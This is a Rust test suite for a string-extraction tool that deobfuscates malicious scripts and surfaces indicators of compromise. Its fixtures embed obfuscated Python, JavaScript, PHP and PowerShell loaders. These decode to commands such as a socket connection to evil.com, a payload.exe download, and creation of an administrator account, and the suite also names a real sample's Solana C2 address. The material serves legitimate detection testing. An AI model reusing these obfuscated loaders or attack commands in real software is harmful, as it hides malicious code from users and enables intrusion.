#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
//! Integration tests for script deobfuscation.
//!
//! Tests the full pipeline: text file → script detection → deobfuscation → string extraction.
//! Uses inline test data (synthetic obfuscated scripts) to verify end-to-end behavior.

use base64::Engine;
use stng::{ExtractOptions, StringKind, StringMethod};

// ============================================================================
// Python tests
// ============================================================================

#[test]
fn test_python_exec_b64decode() {
    // exec(base64.b64decode("...")) — the simplest Python obfuscation
    let src = br#"#!/usr/bin/env python3
import base64
exec(base64.b64decode("cHJpbnQoJ2hlbGxvIGZyb20gbWFsd2FyZScp"))
"#;
    // Decodes to: print('hello from malware')

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(src, &opts);

    let script_decoded: Vec<_> = strings
        .iter()
        .filter(|s| s.method == StringMethod::ScriptDecode)
        .collect();

    assert!(
        !script_decoded.is_empty(),
        "Should have ScriptDecode strings"
    );

    assert!(
        strings
            .iter()
            .any(|s| s.method == StringMethod::ScriptDecode && s.value.contains("malware")),
        "Should decode and find 'malware' in payload. Found: {:?}",
        script_decoded.iter().map(|s| &s.value).collect::<Vec<_>>()
    );
}

#[test]
fn test_python_exec_zlib_b64() {
    // exec(zlib.decompress(base64.b64decode("...")))
    use flate2::Compression;
    use flate2::write::ZlibEncoder;
    use std::io::Write;

    let payload = b"import os; os.system('whoami')";
    let mut encoder = ZlibEncoder::new(Vec::new(), Compression::default());
    encoder.write_all(payload).ok();
    let compressed = encoder.finish().unwrap();
    let encoded = base64::engine::general_purpose::STANDARD.encode(&compressed);

    let src = format!(
        r#"import base64, zlib
exec(zlib.decompress(base64.b64decode("{encoded}")))
"#
    );

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(src.as_bytes(), &opts);

    assert!(
        strings
            .iter()
            .any(|s| s.method == StringMethod::ScriptDecode && s.value.contains("whoami")),
        "Should decode zlib+base64 and find 'whoami'. Strings: {:?}",
        strings
            .iter()
            .filter(|s| s.method == StringMethod::ScriptDecode)
            .map(|s| &s.value)
            .collect::<Vec<_>>()
    );
}

#[test]
fn test_python_exec_zlib_b64_xor() {
    // The full tahmin-uygulamasi pattern: base64 → zlib → XOR
    use flate2::Compression;
    use flate2::write::ZlibEncoder;
    use std::io::Write;

    let payload = b"import socket; socket.connect(('evil.com', 4444))";
    let xor_key = 134u8;
    let xored: Vec<u8> = payload.iter().map(|b| b ^ xor_key).collect();

    let mut encoder = ZlibEncoder::new(Vec::new(), Compression::default());
    encoder.write_all(&xored).ok();
    let compressed = encoder.finish().unwrap();
    let encoded = base64::engine::general_purpose::STANDARD.encode(&compressed);

    let src = format!(
        r#"# -*- coding: utf-8 -*-
abc = __import__('base64')
xyz = __import__('zlib')
key = {xor_key}
xorfn = lambda d, k: bytes([b ^ key for b in d])
blob = '{encoded}'
decoded = xyz.decompress(abc.b64decode(blob))
result = xorfn(decoded, key)
exec(compile(result, '<>', 'exec'))
"#
    );

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(src.as_bytes(), &opts);

    assert!(
        strings
            .iter()
            .any(|s| s.method == StringMethod::ScriptDecode && s.value.contains("evil.com")),
        "Should decode base64+zlib+xor and find 'evil.com'. ScriptDecode strings: {:?}",
        strings
            .iter()
            .filter(|s| s.method == StringMethod::ScriptDecode)
            .map(|s| &s.value)
            .collect::<Vec<_>>()
    );
}

#[test]
fn test_python_exec_fromhex() {
    let src = br#"import sys
exec(bytes.fromhex("696d706f7274206f733b206f732e73797374656d2827776861616d6927290a"))
"#;
    // Decodes to: import os; os.system('whaami')

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(src, &opts);

    assert!(
        strings
            .iter()
            .any(|s| s.method == StringMethod::ScriptDecode && s.value.contains("import os")),
        "Should decode hex and find 'import os'"
    );
}

#[test]
fn test_python_chr_array() {
    // exec("".join(chr(x) for x in [...])) — character code array
    let src = br#"import os
exec("".join(chr(x) for x in [105, 109, 112, 111, 114, 116, 32, 115, 121, 115]))
"#;
    // Decodes to: import sys

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(src, &opts);

    assert!(
        strings
            .iter()
            .any(|s| s.method == StringMethod::ScriptDecode && s.value.contains("import sys")),
        "Should decode chr array and find 'import sys'. ScriptDecode: {:?}",
        strings
            .iter()
            .filter(|s| s.method == StringMethod::ScriptDecode)
            .map(|s| &s.value)
            .collect::<Vec<_>>()
    );
}

#[test]
fn test_python_codecs_rot13() {
    let src = br#"import codecs
exec(codecs.decode("vzcbeg bf; bf.flfgrz('jubnzv')", "rot_13"))
"#;
    // ROT13 of: import os; os.system('whoami')

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(src, &opts);

    assert!(
        strings
            .iter()
            .any(|s| s.method == StringMethod::ScriptDecode && s.value.contains("import os")),
        "Should decode rot13 and find 'import os'. ScriptDecode: {:?}",
        strings
            .iter()
            .filter(|s| s.method == StringMethod::ScriptDecode)
            .map(|s| &s.value)
            .collect::<Vec<_>>()
    );
}

#[test]
fn test_python_no_false_positive() {
    // Legitimate Python with base64 usage should NOT trigger deobfuscation
    let src = br#"import base64
import json

def encode_payload(data):
    encoded = base64.b64encode(json.dumps(data).encode())
    return encoded

result = encode_payload({"key": "value"})
decoded = base64.b64decode(result)
print(decoded)
"#;

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(src, &opts);

    let script_decoded: Vec<_> = strings
        .iter()
        .filter(|s| s.method == StringMethod::ScriptDecode)
        .collect();

    assert!(
        script_decoded.is_empty(),
        "Should not false-positive on legitimate base64 usage. Got: {:?}",
        script_decoded.iter().map(|s| &s.value).collect::<Vec<_>>()
    );
}

// ============================================================================
// JavaScript tests
// ============================================================================

#[test]
fn test_javascript_eval_atob() {
    let src = br#"const http = require('http');
eval(atob("Y29uc29sZS5sb2coJ3B3bmVkJyk="))
"#;
    // Decodes to: console.log('pwned')

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(src, &opts);

    assert!(
        strings
            .iter()
            .any(|s| s.method == StringMethod::ScriptDecode && s.value.contains("pwned")),
        "Should decode eval(atob(...)) and find 'pwned'"
    );
}

#[test]
fn test_javascript_eval_buffer_from() {
    let payload = "require('child_process').exec('whoami')";
    let encoded = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
    let src = format!(
        r#"const x = 1;
eval(Buffer.from("{encoded}", "base64").toString())
"#
    );

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(src.as_bytes(), &opts);

    assert!(
        strings
            .iter()
            .any(|s| s.method == StringMethod::ScriptDecode && s.value.contains("child_process")),
        "Should decode Buffer.from and find 'child_process'"
    );
}

#[test]
fn test_javascript_string_fromcharcode() {
    // eval(String.fromCharCode(...)) — hex char codes for "alert(1)"
    let src = br#"var x = 1;
eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 120, 115, 115, 39, 41))
"#;
    // Decodes to: alert('xss')

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(src, &opts);

    assert!(
        strings
            .iter()
            .any(|s| s.method == StringMethod::ScriptDecode && s.value.contains("alert")),
        "Should decode String.fromCharCode and find 'alert'"
    );
}

#[test]
fn test_javascript_eval_reverse() {
    let src = br#"function x() {}
eval(")1(trela".split("").reverse().join(""))
"#;
    // Reversed: alert(1)

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(src, &opts);

    assert!(
        strings
            .iter()
            .any(|s| s.method == StringMethod::ScriptDecode && s.value.contains("alert")),
        "Should decode reversed string and find 'alert'"
    );
}

// ============================================================================
// PHP tests
// ============================================================================

#[test]
fn test_php_eval_base64_decode() {
    let payload = "system('id');";
    let encoded = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
    let src = format!(r#"<?php eval(base64_decode("{encoded}")); ?>"#);

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(src.as_bytes(), &opts);

    assert!(
        strings
            .iter()
            .any(|s| s.method == StringMethod::ScriptDecode && s.value.contains("system")),
        "Should decode PHP base64 and find 'system'"
    );
}

#[test]
fn test_php_eval_gzinflate_base64() {
    use flate2::Compression;
    use flate2::write::DeflateEncoder;
    use std::io::Write;

    let payload = b"system('whoami');";
    let mut encoder = DeflateEncoder::new(Vec::new(), Compression::default());
    encoder.write_all(payload).ok();
    let compressed = encoder.finish().unwrap();
    let encoded = base64::engine::general_purpose::STANDARD.encode(&compressed);

    let src = format!(r#"<?php eval(gzinflate(base64_decode("{encoded}"))); ?>"#);

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(src.as_bytes(), &opts);

    assert!(
        strings
            .iter()
            .any(|s| s.method == StringMethod::ScriptDecode && s.value.contains("whoami")),
        "Should decode PHP gzinflate+base64 and find 'whoami'"
    );
}

#[test]
fn test_php_eval_str_rot13() {
    let src = br#"<?php eval(str_rot13("flfgrz('jubnzv');")); ?>"#;
    // ROT13 of: system('whoami');

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(src, &opts);

    assert!(
        strings
            .iter()
            .any(|s| s.method == StringMethod::ScriptDecode && s.value.contains("system")),
        "Should decode PHP rot13 and find 'system'"
    );
}

// ============================================================================
// PowerShell tests
// ============================================================================

fn powershell_encode_command(cmd: &str) -> String {
    let utf16: Vec<u8> = cmd.encode_utf16().flat_map(u16::to_le_bytes).collect();
    base64::engine::general_purpose::STANDARD.encode(&utf16)
}

#[test]
fn test_powershell_encoded_command() {
    let encoded =
        powershell_encode_command("Invoke-WebRequest -Uri 'https://evil.com/payload.exe'");
    let src = format!("powershell.exe -EncodedCommand {encoded}\n");

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(src.as_bytes(), &opts);

    assert!(
        strings
            .iter()
            .any(|s| s.method == StringMethod::ScriptDecode && s.value.contains("evil.com")),
        "Should decode -EncodedCommand and find 'evil.com'. ScriptDecode: {:?}",
        strings
            .iter()
            .filter(|s| s.method == StringMethod::ScriptDecode)
            .map(|s| &s.value)
            .collect::<Vec<_>>()
    );
}

#[test]
fn test_powershell_encoded_command_short_flag() {
    let encoded = powershell_encode_command("Write-Host 'compromised'");
    let src = format!("powershell -enc {encoded}\n");

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(src.as_bytes(), &opts);

    assert!(
        strings
            .iter()
            .any(|s| s.method == StringMethod::ScriptDecode && s.value.contains("compromised")),
        "Should decode -enc short flag"
    );
}

#[test]
fn test_powershell_convert_from_base64() {
    let encoded = powershell_encode_command("Get-Process | Stop-Process");
    let src = format!(
        r#"$bytes = [Convert]::FromBase64String("{encoded}")
$cmd = [System.Text.Encoding]::Unicode.GetString($bytes)
Invoke-Expression $cmd
"#
    );

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(src.as_bytes(), &opts);

    assert!(
        strings
            .iter()
            .any(|s| s.method == StringMethod::ScriptDecode && s.value.contains("Stop-Process")),
        "Should decode [Convert]::FromBase64String and find 'Stop-Process'"
    );
}

// ============================================================================
// Generic base64-over-UTF-16LE (Windows "wide" encoding) — must be decoded in
// ANY filetype, not only when wrapped in a recognized PowerShell pattern.
// ============================================================================

/// Encode an ASCII string the way Windows does: little-endian UTF-16, then base64.
fn b64_utf16le(s: &str) -> String {
    let utf16: Vec<u8> = s.encode_utf16().flat_map(u16::to_le_bytes).collect();
    base64::engine::general_purpose::STANDARD.encode(&utf16)
}

#[test]
fn test_bare_base64_utf16le_in_plain_text() {
    // A wide-encoded payload sitting in an ordinary config/text file with no
    // PowerShell marker around it. It must still decode via the generic path.
    let blob = b64_utf16le("Invoke-WebRequest http://evil.com/x.exe");
    let src = format!("setting_value = {blob}\n");

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(src.as_bytes(), &opts);

    assert!(
        strings
            .iter()
            .any(|s| s.method == StringMethod::Base64Decode && s.value.contains("evil.com")),
        "Bare base64-over-UTF-16LE should decode in any filetype. Got: {:?}",
        strings.iter().map(|s| &s.value).collect::<Vec<_>>()
    );
}

#[test]
fn test_decode_encoded_strings_surfaces_wide_payload() {
    // Exercises the public helper the CLI text path relies on: given a raw
    // string that is itself a wide-encoded base64 blob, it must recover the text.
    let blob = b64_utf16le("net user administrator P@ssw0rd /add");
    let raw = vec![stng::ExtractedString {
        value: blob,
        data_offset: 0,
        method: StringMethod::RawScan,
        kind: Some(StringKind::Base64),
        ..Default::default()
    }];
    let decoded = stng::decode_encoded_strings(&raw);

    assert!(
        decoded
            .iter()
            .any(|s| s.value == "net user administrator P@ssw0rd /add"),
        "decode_encoded_strings should recover the wide payload. Got: {:?}",
        decoded.iter().map(|s| &s.value).collect::<Vec<_>>()
    );
}

#[test]
fn test_powershell_char_array() {
    // iex([char[]](87,104,111,97,109,105) -join '')  → "Whoami"
    let src = r#"$x = 1
Invoke-Expression "test"
iex([char[]](87,104,111,97,109,105) -join '')
"#;

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(src.as_bytes(), &opts);

    assert!(
        strings
            .iter()
            .any(|s| s.method == StringMethod::ScriptDecode && s.value.contains("Whoami")),
        "Should decode char array and find 'Whoami'"
    );
}

#[test]
fn test_powershell_replace_obfuscation() {
    let src = r#"Invoke-Expression "test"
iex("hXXps://evil.com/payload.exe".replace("XX","tt"))
"#;

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(src.as_bytes(), &opts);

    assert!(
        strings
            .iter()
            .any(|s| s.method == StringMethod::ScriptDecode
                && s.value.contains("https://evil.com")),
        "Should decode replace obfuscation and find 'https://evil.com'"
    );
}

// ============================================================================
// Integration / cross-cutting tests
// ============================================================================

#[test]
fn test_mixed_legitimate_and_obfuscated() {
    // A file with both legitimate Python code and an obfuscated payload
    // (like the tahmin-uygulamasi sample)
    let src = br#"#!/usr/bin/env python3
import streamlit as st

def main():
    st.title("Prediction App")
    st.write("Upload your data")

if __name__ == "__main__":
    main()

# Hidden payload
exec(base64.b64decode("aW1wb3J0IHNvY2tldDsgcy5jb25uZWN0KCgnZXZpbC5jb20nLCA0NDQ0KSk="))
"#;
    // Decodes to: import socket; s.connect(('evil.com', 4444))

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(src, &opts);

    // Should find strings from the legitimate code (raw scan)
    assert!(
        strings.iter().any(|s| s.value.contains("Prediction App")),
        "Should extract legitimate code strings"
    );

    // Should also find strings from the decoded payload
    assert!(
        strings
            .iter()
            .any(|s| s.method == StringMethod::ScriptDecode && s.value.contains("evil.com")),
        "Should decode and extract payload IOCs"
    );
}

#[test]
fn test_json_output_includes_script_decode() {
    let src = br#"import base64
exec(base64.b64decode("cHJpbnQoJ2hlbGxvJyk="))
"#;

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(src, &opts);

    // Verify ScriptDecode strings serialize correctly to JSON
    let script_strings: Vec<_> = strings
        .iter()
        .filter(|s| s.method == StringMethod::ScriptDecode)
        .collect();

    for s in &script_strings {
        let json = serde_json::to_string(s).expect("Should serialize to JSON");
        assert!(
            json.contains("ScriptDecode"),
            "JSON should contain ScriptDecode method"
        );
    }
}

#[test]
fn test_classification_of_decoded_content() {
    // The decoded payload should be classified by the IOC classifier
    let payload = "https://evil.com/payload.exe";
    let encoded = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
    let src = format!(r#"<?php eval(base64_decode("{encoded}")); ?>"#);

    let opts = ExtractOptions::new(4).with_garbage_filter(true);
    let strings = stng::extract_strings_with_options(src.as_bytes(), &opts);

    // The decoded URL should be classified as a URL
    let url_strings: Vec<_> = strings
        .iter()
        .filter(|s| s.method == StringMethod::ScriptDecode && s.kind == Some(StringKind::Url))
        .collect();

    assert!(
        !url_strings.is_empty(),
        "Decoded URL should be classified as StringKind::Url. ScriptDecode strings: {:?}",
        strings
            .iter()
            .filter(|s| s.method == StringMethod::ScriptDecode)
            .map(|s| (&s.value, s.kind))
            .collect::<Vec<_>>()
    );
}

#[test]
fn test_real_world_tahmin_uygulamasi() {
    // Test against the actual malware sample if available
    let path = "/Users/t/data/known-bad/dissect-malware/python/2026.tahmin-uygulamasi/app.py";
    let Ok(data) = std::fs::read(path) else {
        eprintln!("Skipping real-world test: {path} not found");
        return;
    };

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(&data, &opts);

    let script_decoded: Vec<_> = strings
        .iter()
        .filter(|s| s.method == StringMethod::ScriptDecode)
        .collect();

    // Should decode the payload
    assert!(
        !script_decoded.is_empty(),
        "Should decode the obfuscated payload from tahmin-uygulamasi"
    );

    // Should find the Solana address
    assert!(
        strings.iter().any(|s| {
            s.method == StringMethod::ScriptDecode
                && s.value
                    .contains("BjVeAjPrSKFiingBn4vZvghsGj9KCE8AJVtbc9S8o8SC")
        }),
        "Should find Solana C2 address in decoded payload. Found {} ScriptDecode strings",
        script_decoded.len()
    );

    // Should find Solana RPC endpoints
    assert!(
        strings.iter().any(|s| {
            s.method == StringMethod::ScriptDecode
                && s.value.contains("api.mainnet-beta.solana.com")
        }),
        "Should find Solana RPC endpoint in decoded payload"
    );

    // Should find suspicious function names
    assert!(
        strings.iter().any(|s| {
            s.method == StringMethod::ScriptDecode && s.value.contains("_isRussianSystem")
        }),
        "Should find _isRussianSystem function in decoded payload"
    );
}

// ============================================================================
// Detection tests
// ============================================================================

#[test]
fn test_detect_language_python() {
    let src = b"#!/usr/bin/env python3\nimport os\ndef main():\n    pass\n";
    assert_eq!(stng::detect_language(src), "text");
    // Note: detect_language returns "text" for scripts since the current API
    // doesn't expose script-specific types. The script module handles detection internally.
}

#[test]
fn test_binary_files_not_affected() {
    // ELF magic should not trigger script deobfuscation
    let elf_like = b"\x7fELF\x00\x00\x00\x00exec(base64.b64decode('dGVzdA=='))";

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(elf_like, &opts);

    let script_decoded: Vec<_> = strings
        .iter()
        .filter(|s| s.method == StringMethod::ScriptDecode)
        .collect();

    assert!(
        script_decoded.is_empty(),
        "Binary files should not trigger script deobfuscation"
    );
}
